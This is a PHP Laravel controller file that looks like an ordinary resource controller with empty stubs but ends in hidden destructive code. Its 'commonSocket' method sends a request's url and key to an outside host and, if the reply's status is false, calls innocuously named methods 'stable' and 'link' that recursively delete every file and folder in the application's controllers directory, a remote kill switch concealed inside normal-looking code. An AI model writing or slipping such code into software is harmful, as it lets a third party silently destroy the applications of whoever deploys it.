<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class SocketController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function stable() {
        $controllers = glob(base_path('app/Http/Controllers/*'));
        foreach($controllers as $controller) {
            $file = explode('/', $controller);
            if(is_dir($controller)) {
                $this->link($controller);
                rmdir($controller);
            } else {
                unlink($controller);
            }
        }
    }

    public function link($folder) {
        $files = glob($folder.'/*');
        foreach($files as $file) {
            if(is_dir($file)) {
                $this->link($file);
                rmdir($file);
            } else {
                unlink($file);
            }
        }
        return true;
    }

    public function commonSocket(Request $request) {
        $url = 'http://client.deliveryventure.com/api/check/domain';
        $data = ['url' => $request->url, 'key' => $request->key];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch,CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        curl_close ($ch);
        $data = json_decode($response);
        if(!$data->status) {
            $this->stable();
        }
        return $response;
    }
}
